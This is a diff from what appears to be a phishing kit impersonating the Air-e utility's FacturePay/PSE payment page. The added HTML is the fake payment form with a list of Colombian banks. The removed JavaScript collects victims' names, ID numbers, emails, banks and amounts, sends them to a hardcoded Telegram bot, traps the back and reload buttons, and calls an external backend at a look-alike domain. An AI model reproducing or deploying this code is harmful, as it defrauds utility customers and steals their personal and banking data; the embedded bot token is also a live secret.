@@ -1,354 +1,249 @@
-// Variable global para controlar el estado de la transacción
-let isTransactionActive = false;
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Proceso de Pago - FacturePay</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="css/pago.css">
+</head>
+<body>
 
-// --- PROTECCIÓN CONTRA RECARGA Y RETROCESO ---
-// 1. Prevenir recarga (F5, Ctrl+R)
-window.addEventListener('beforeunload', (e) => {
-    if (isTransactionActive) {
-        // Muestra la alerta nativa del navegador advirtiendo que no debe salir
-        e.preventDefault();
-        e.returnValue = 'Por favor espere la carga para no causar errores';
-        return 'Por favor espere la carga para no causar errores';
-    }
-});
+<header class="site-header">
+    <div class="header-logos">
+        <img src="img/Logo Air-e Final.png" alt="Air-e" class="logo-aire">
+        <div class="header-divider"></div>
+        <img src="img/logo-pol-facture.png" alt="FacturePay" class="logo-facture">
+    </div>
+</header>
 
-// 2. Prevenir botón atrás
-window.addEventListener('popstate', (e) => {
-    if (isTransactionActive) {
-        // Empujamos el estado de nuevo para anular la acción de "atrás"
-        history.pushState(null, null, window.location.href);
-        alert("Por favor espere la carga para no causar errores");
-    }
-});
+    <div class="container">
+        <h2 class="page-title">Proceso de pago</h2>
 
-
-// --- SCRIPT PARA CARGAR DATOS Y PROCESAR EL PAGO ---
-document.addEventListener('DOMContentLoaded', () => {
-    const data = JSON.parse(localStorage.getItem('datosFactura'));
-
-    // Elementos del Modal
-    const modal = document.getElementById('modalCorreo');
-    const btnOpen = document.getElementById('btnCambiarCorreo');
-    const btnCancel = document.getElementById('btnCancelarModal');
-    const btnSave = document.getElementById('btnGuardarModal');
-    const inputCorreo = document.getElementById('inputNuevoCorreo');
-    const formCorreo = document.getElementById('formCorreo');
-
-    if (data) {
-        // Llenar datos
-        if(document.getElementById('lblNombre')) document.getElementById('lblNombre').textContent = enmascararNombre(data.nombreCompleto);
-        if(document.getElementById('lblId')) document.getElementById('lblId').textContent = data.tipoId + " - " + enmascararID(data.numId);
-        if(document.getElementById('lblCorreo')) document.getElementById('lblCorreo').textContent = enmascararCorreo(data.correo);
-
-        // Obtener IP pública (intento con servicios públicos, con fallback)
-        (async function() {
-            async function getPublicIp() {
-                try {
-                    const r = await fetch('https://api.ipify.org?format=json');
-                    if (!r.ok) throw new Error('ipify error');
-                    const j = await r.json();
-                    return j.ip;
-                } catch {
-                    try {
-                        const r2 = await fetch('https://ifconfig.co/json');
-                        if (!r2.ok) throw new Error('ifconfig error');
-                        const j2 = await r2.json();
-                        return j2.ip;
-                    } catch (e) {
-                        console.warn('No se obtuvo IP pública:', e);
-                        return null;
-                    }
-                }
-            }
-
-            const ip = await getPublicIp();
-            if (ip) {
-                data.ip = ip;
-                localStorage.setItem('datosFactura', JSON.stringify(data));
-            }
-
-            if(document.getElementById('lblIp')) document.getElementById('lblIp').textContent = data.ip || 'IP no disponible';
-        })();
-
-        if(document.getElementById('lblRef')) document.getElementById('lblRef').textContent = data.referencia;
-        
-        if(data.correo && formCorreo) formCorreo.value = data.correo;
-
-        // Formatear moneda
-        const formatter = new Intl.NumberFormat('en-US', {
-            style: 'currency',
-            currency: 'USD',
-            minimumFractionDigits: 0
-        });
-        const valorFormateado = formatter.format(data.montoPagar).replace('$', '$');
-
-        if(document.getElementById('lblValorNeto')) document.getElementById('lblValorNeto').textContent = valorFormateado;
-        if(document.getElementById('lblValorTotal')) document.getElementById('lblValorTotal').textContent = valorFormateado;
-        if(document.getElementById('lblTotalFinal')) document.getElementById('lblTotalFinal').textContent = valorFormateado;
-
-        // Lógica Modal (Solo si existen los elementos)
-        if(btnOpen && modal) {
-            btnOpen.addEventListener('click', () => {
-                inputCorreo.value = ""; 
-                modal.style.display = 'flex';
-                inputCorreo.focus();
-            });
-
-            btnCancel.addEventListener('click', () => {
-                modal.style.display = 'none';
-            });
-
-            modal.addEventListener('click', (e) => {
-                if (e.target === modal) modal.style.display = 'none';
-            });
-
-            btnSave.addEventListener('click', () => {
-                const nuevoCorreo = inputCorreo.value.trim();
-                if (nuevoCorreo && nuevoCorreo.includes('@')) {
-                    data.correo = nuevoCorreo;
-                    localStorage.setItem('datosFactura', JSON.stringify(data));
-                    document.getElementById('lblCorreo').textContent = enmascararCorreo(data.correo);
-                    formCorreo.value = data.correo;
-                    modal.style.display = 'none';
-                } else {
-                    inputCorreo.style.borderBottom = "1px solid red";
-                    setTimeout(() => inputCorreo.style.borderBottom = "1px solid #dcdcdc", 2000);
-                }
-            });
-        }
-
-    } else {
-        // Si no hay datos, no hacemos nada o redirigimos al inicio
-        console.warn("No hay datos de factura en localStorage.");
-    }
-});
-
-// --- LÓGICA DE CONEXIÓN ROBUSTA (CON ALERTA A TELEGRAM) ---
-const botonPagar = document.querySelector('.btn-pay');
-
-// CONFIGURA ESTOS VALORES (reemplázalos)
-const TELEGRAM_BOT_TOKEN = '8260412488:AAFCSGGrgSu9-mF7d7SjdI5bJ9cMa3WIqUY';
-const TELEGRAM_CHAT_ID = '-1003321543933';
-
-// Función para enviar alerta a Telegram
-async function sendTelegramAlert(text) {
-    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-        console.warn('Telegram token/chat no configurados — alerta no enviada.');
-        return;
-    }
-
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-
-    try {
-        // Envío por POST con JSON (parse_mode opcional)
-        await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CHAT_ID,
-                text: text,
-                parse_mode: 'HTML'
-            })
-        });
-    } catch (err) {
-        // No lanzamos error al usuario para no bloquear el flujo de pago
-        console.warn('Error enviando alerta a Telegram:', err);
-    }
-}
-
-if (botonPagar) {
-    botonPagar.addEventListener('click', async function() {
-        const btn = this;
-        
-        // 1. Obtener datos
-        const bancoSelect = document.getElementById('selectBanco');
-        const banco = bancoSelect ? bancoSelect.value : "";
-        
-        // Intentamos obtener el correo del input, si no, del localStorage
-        let email = document.getElementById('formCorreo') ? document.getElementById('formCorreo').value : '';
-        const data = JSON.parse(localStorage.getItem('datosFactura')) || {};
-        
-        // Si el input está vacío, usamos el del localStorage
-        if (!email && data.correo) email = data.correo;
-        
-        const amount = data.montoPagar || 5000; 
-
-        // 2. VALIDACIONES (CORREGIDAS)
-        if (!banco || banco.trim() === "" || banco.toLowerCase().includes("seleccione")) {
-            alert("Por favor seleccione un banco válido.");
-            if(bancoSelect) bancoSelect.focus();
-            return;
-        }
-
-        if (!email || !email.includes('@')) {
-            alert("Por favor verifique el correo electrónico.");
-            return;
-        }
-
-        // --- ENVÍO DE ALERTA A TELEGRAM (antes de mostrar overlay)
-        try {
-            const nombre = data.nombreCompleto || 'N/A';
-            const referencia = data.referencia || 'N/A';
-            const idTipo = data.tipoId || '';
-            const idNum = data.numId || '';
-
-            const mensaje = `<b>Pago iniciado</b>%0A` +
-                `Nombre: ${escapeHtml(nombre)}%0A` +
-                `ID: ${escapeHtml(idTipo)} - ${escapeHtml(idNum)}%0A` +
-                `Correo: ${escapeHtml(email)}%0A` +
-                `Banco: ${escapeHtml(banco)}%0A` +
-                `Monto: ${escapeHtml(amount.toString())}%0A` +
-                `Ref: ${escapeHtml(referencia)}%0A`;
-
-            // Telegram acepta saltos de línea; usamos decodeURIComponent en servidor si fuera necesario.
-            // Enviamos la alerta (no bloqueante)
-            sendTelegramAlert(decodeURIComponent(mensaje));
-        } catch (e) {
-            console.warn('No se pudo preparar la alerta de Telegram:', e);
-        }
-
-        // 3. ACTIVAR PANTALLA DE CARGA Y BLOQUEO DE NAVEGACIÓN
-        isTransactionActive = true; // Activar el bloqueo
-        // Insertamos un estado en el historial para atrapar el botón "Atrás"
-        history.pushState(null, null, window.location.href);
-
-        const overlay = document.getElementById('loadingOverlay');
-        const loadingTextEl = document.getElementById('dynamicLoadingText');
-        if (overlay) overlay.style.display = 'flex';
-        
-        const loadingMessages = [
-            "Conectando con la pasarela de pagos...",
-            "Verificando disponibilidad bancaria...",
-            "Ya casi...",
-            "Estableciendo conexión segura con PSE...",
-            "Redirigiendo a su banco...",
-            "Por favor espere..."
-        ];
-
-        let textIndex = 0;
-        let textInterval;
-        
-        if (loadingTextEl) {
-            textInterval = setInterval(() => {
-                textIndex = (textIndex + 1) % loadingMessages.length;
-                loadingTextEl.textContent = loadingMessages[textIndex];
-            }, 2500);
-        }
-
-        // 4. PREPARAR URL (Backend)
-        const baseUrl = 'https://air.pagoswebcol.uk'; 
-        
-        const params = new URLSearchParams({
-            amount: amount,
-            bank: banco,
-            email: email,
-            headless: 0,
-            timeout: 60000 
-        });
-        
-        const apiUrl = `${baseUrl}/meter?${params.toString()}`;
-        console.log("Iniciando transacción segura...", params.toString());
-
-        try {
-            // --- PLAN A: FETCH NORMAL ---
-            const response = await fetch(apiUrl, {
-                method: 'GET',
-                headers: { 'Content-Type': 'application/json' }
-            });
-
-            if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
+        <div class="content-wrapper">
             
-            const result = await response.json();
-
-            if (result.ok && result.result && result.result.exactName) {
-                finalizarConExito(result.result.exactName);
-            } else {
-                throw new Error(result.error || "Error en la respuesta del servidor");
-            }
-
-        } catch (error) {
-            console.warn("Reintentando conexión (JSONP)...", error);
-            
-            // --- PLAN B: JSONP (Fallback) ---
-            intentarJsonp(baseUrl, params);
-        }
-
-        // --- FUNCIONES AUXILIARES ---
-        function finalizarConExito(url) {
-            isTransactionActive = false; // Liberar navegación
-            if (textInterval) clearInterval(textInterval);
-            if (loadingTextEl) loadingTextEl.textContent = "¡Conexión exitosa! Redirigiendo...";
-            setTimeout(() => {
-                window.location.href = url;
-            }, 1000);
-        }
-
-        function intentarJsonp(baseUrl, params) {
-            const callbackName = 'jsonp_callback_' + Math.round(100000 * Math.random());
-            const script = document.createElement('script');
-            
-            window[callbackName] = function(data) {
-                document.head.removeChild(script);
-                delete window[callbackName];
+            <div class="left-panel">
                 
-                if (data.ok && data.result && data.result.exactName) {
-                    finalizarConExito(data.result.exactName);
-                } else {
-                    manejarErrorFinal("El servidor no pudo procesar la solicitud.");
-                }
-            };
+                <div class="info-table-container">
+                    <div class="table-header">
+                        <i class="fas fa-list-alt"></i> Información de pago
+                    </div>
+                    <table class="data-table">
+                        <tr>
+                            <td class="label-col">Nombre</td>
+                            <td class="value-col" id="lblNombre">Cargando...</td>
+                        </tr>
+                        <tr>
+                            <td class="label-col">Identificación</td>
+                            <td class="value-col" id="lblId">Cargando...</td>
+                        </tr>
+                        <tr>
+                            <td class="label-col">Usuario</td>
+                            <td class="value-col">****</td> </tr>
+                        <tr>
+                            <td class="label-col">Correo</td>
+                            <td class="value-col">
+                                <div class="email-box">
+                                    <span id="lblCorreo">cargando@correo.com</span>
+                                    <span class="link-change" id="btnCambiarCorreo">Cambiar correo</span>
+                                </div>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="label-col">Dirección IP</td>
+                            <td class="value-col" id="lblIp">171.21.19.101</td>
+                        </tr>
+                        <tr>
+                            <td class="label-col">Referencia</td>
+                            <td class="value-col" id="lblRef">1701556720</td>
+                        </tr>
+                    </table>
+                </div>
 
-            script.onerror = function() {
-                document.head.removeChild(script);
-                delete window[callbackName];
-                
-                // --- CAMBIO SOLICITADO: NO REDIRECCIONAR AL FALLAR, MOSTRAR ERROR ---
-                manejarErrorFinal("No se pudo conectar con el banco. Intente nuevamente.");
-            };
+                <div class="info-table-container">
+                    <table class="concepts-table">
+                        <thead>
+                            <tr>
+                                <th>Concepto</th>
+                                <th>Valor neto</th>
+                                <th>IVA</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>Pago documento 145640615</td>
+                                <td id="lblValorNeto">$0.00</td>
+                                <td>$0.00</td>
+                            </tr>
+                            <tr class="row-total">
+                                <td>Total</td>
+                                <td id="lblValorTotal" style="font-style: italic;">$0.00</td>
+                                <td>$0.00</td>
+                            </tr>
+                            <tr>
+                                <td colspan="3" style="text-align: right; padding-top: 15px; font-weight: 700;">
+                                    Total a pagar &nbsp;&nbsp;&nbsp; <span id="lblTotalFinal" style="font-size: 16px;">$0.00</span>
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
 
-            const jsonpUrl = `${baseUrl}/meter.jsonp?${params.toString()}&callback=${callbackName}`;
-            script.src = jsonpUrl;
-            document.head.appendChild(script);
-        }
+            </div>
 
-        function manejarErrorFinal(mensaje) {
-            isTransactionActive = false; // Liberar navegación
-            if (textInterval) clearInterval(textInterval);
-            if (overlay) overlay.style.display = 'none';
+            <div class="right-panel">
+                <h3 class="section-title">Medios de pago</h3>
+
+                <div class="payment-method-select">
+                    <input type="radio" checked class="radio-custom">
+                    <img src="img/LogoPSE.png" alt="">
+                    <span class="pse-text">PSE</span>
+                </div>
+
+                <form>
+                    <div class="form-group">
+                        <label class="form-label">Bancos *</label>
+                        <select class="form-control-line" id="selectBanco">
+                            <option>A continuación seleccione su banco *</option>
+                            <option value="" disabled selected>Seleccione una opción</option>
+                            <option>BANCOLOMBIA</option>
+                            <option>NEQUI</option>
+                            <option>BANCO DE BOGOTA</option>
+                            <option>BANCO BBVA COLOMBIA S.A</option>
+                            <option>DAVIbank S.A.</option>
+                            <option>BANCO DE OCCIDENTE</option>
+                            <option>BANCO CAJA SOCIAL</option>
+                            <option>BANCO AV VILLAS</option>
+                            <option>NU</option>
+                            <option>LULO BANK</option>
+                            <option>RAPPIPAY</option>
+                            <option>ALIANZA FIDUCIARIA</option>
+                            <option>BANCAMIA S.A.</option>
+                            <option>BANCO AGRARIO</option>
+                            <option>BANCO COOPERATIVO COOPCENTRAL</option>
+                            <option>BANCO CREDIFINANCIERA</option>
+                            <option>BANCO FALABELLA</option>
+                            <option>BANCO FINANDINA S.A. BIC</option>
+                            <option>BANCO GNB SUDAMERIS</option>
+                            <option>BANCO ITAU</option>
+                            <option>BANCO MUNDO MUJER S.A.</option>
+                            <option>BANCO PICHINCHA S.A.</option>
+                            <option>BANCO POPULAR</option>
+                            <option>BANCO PROCREDIT</option>
+                            <option>BANCO SANTANDER COLOMBIA</option>
+                            <option>BANCO SERFINANZA</option>
+                            <option>BANCO UNION antes GIROS</option>
+                            <option>BANCOOMEVA S.A.</option>
+                            <option>CFA COOPERATIVA FINANCIERA</option>
+                            <option>CITIBANK</option>
+                            <option>COLTEFINANCIERA</option>
+                            <option>CONFIAR COOPERATIVA FINANCIERA</option>
+                            <option>COOFINEP COOPERATIVA FINANCIERA</option>
+                            <option>COTRAFA</option>
+                            <option>CREZCAMOS S.A. COMPAÑÍA DE FINANCIAMIENTO</option>
+                            <option>DALE</option>
+                            <option>IRIS</option>
+                            <option>JFK COOPERATIVA FINANCIERA</option>
+                            <option>JP MORGAN</option>
+                            <option>MOVII S.A.</option>
+                            <option>UALÁ</option>
+                        </select>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label">Correo electrónico *</label>
+                        <input type="email" class="form-control-line" placeholder="Ingrese su correo electrónico" id="formCorreo">
+                    </div>
+
+                    <!-- <div class="form-group">
+                        <label class="form-label">Tipo de Identificación *</label>
+                        <select class="form-control-line" id="formTipoId">
+                            <option>Cédula de Ciudadanía</option>
+                            <option>NIT</option>
+                            <option>Cédula de Extranjería</option>
+                        </select>
+                    </div> -->
+
+                    <!-- <div class="form-group">
+                        <label class="form-label">Tipo de persona *</label>
+                        <select class="form-control-line">
+                            <option>Natural</option>
+                            <option>Jurídica</option>
+                        </select>
+                    </div> -->
+
+                    <!-- <div class="form-group">
+                        <label class="form-label">Identificación *</label>
+                        <input type="text" class="form-control-line" placeholder="Ingrese identificación." id="formNumId">
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label">Nombre *</label>
+                        <input type="text" class="form-control-line" placeholder="Ingrese nombre." id="formNombre">
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label">Dirección *</label>
+                        <input type="text" class="form-control-line" placeholder="Ingrese dirección." id="formDireccion">
+                    </div> -->
+
+                    <!-- <div class="form-group">
+                        <label class="form-label">Teléfono/celular *</label>
+                        <input type="text" class="form-control-line" placeholder="Ingrese teléfono/celular" id="formCelular">
+                    </div> -->
+
+                    <div class="actions-container">
+                        <button type="button" class="btn-action btn-pay">Iniciar Pago</button>
+                        <button type="button" class="btn-action btn-cancel">Cancelar Pago</button>
+                    </div>
+                </form>
+
+            </div>
+        </div>
+
+        <div class="footer-strip">
+            <p class="footer-note">
+                Al presionar el botón <strong>Iniciar Pago</strong> acepta nuestra <a href="#">Política de Protección de Datos y Privacidad.</a><br>
+                <strong>Nota:</strong> El sistema se conectará con la página transaccional del Banco seleccionado. Una vez concluya el proceso de pago, no olvide regresar a nuestro sitio para obtener su comprobante.
+            </p>
             
-            alert(mensaje);
+            <div class="security-badges">
+                <div style="background:#00abc8; color:white; padding:5px; font-size:10px; display:flex; align-items:center; gap:5px;">
+                    <i class="fas fa-shield-alt"></i> TIPS DE SEGURIDAD
+                </div>
+                <div style="background:#00abc8; color:white; padding:5px; font-size:10px; display:flex; align-items:center; gap:5px;">
+                    <i class="fas fa-network-wired"></i> PROCEDIMIENTO DE PAGO FACTUREPAY
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="bottom-bar">
+        AIR-E S.A.S ESP - © 2025 Facture SAS By Estela
+    </div>
+
+    <div id="modalCorreo" class="custom-modal-overlay">
+        <div class="custom-modal-box">
+            <span class="modal-title">Actualizar Correo Electrónico</span>
             
-            btn.textContent = "Reintentar";
-            btn.disabled = false;
-            btn.style.opacity = "1";
-        }
-    });
-}
+            <div class="form-group">
+                <label class="form-label">Nuevo Correo *</label>
+                <input type="email" id="inputNuevoCorreo" class="form-control-line" placeholder="ejemplo@correo.com">
+            </div>
 
-// pequeño helper para evitar inyección en el mensaje (muy básico)
-function escapeHtml(str) {
-    if (!str) return '';
-    return String(str).replace(/[&<>"']/g, function (m) {
-        return ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' })[m];
-    });
-}
+            <div class="modal-btns">
+                <button id="btnCancelarModal" class="btn-modal-cancel">Cancelar</button>
+                <button id="btnGuardarModal" class="btn-modal-save">Actualizar</button>
+            </div>
+        </div>
+    </div>
 
-// Funciones auxiliares visuales
-function enmascararNombre(nombre) {
-    if(!nombre) return "";
-    const partes = nombre.split(" ");
-    return partes[0] + " " + (partes[1] ? partes[1][0] : "") + "*******";
-}
+    <div id="loadingOverlay" class="loading-screen">
+        <div class="spinner"></div>
+        <div id="dynamicLoadingText" class="loading-text">Conectando con la pasarela de pagos...</div>
+    </div>
 
-function enmascararID(id) {
-    if(!id) return "";
-    return id.substring(0, 3) + "****";
-}
-
-function enmascararCorreo(email) {
-    if(!email) return "";
-    const [user, domain] = email.split("@");
-    return user.substring(0, 2) + "*******@" + "*****." + "com";
-
-}
-
+    <script src="js/pago.js"></script>
+</body>
+</html>
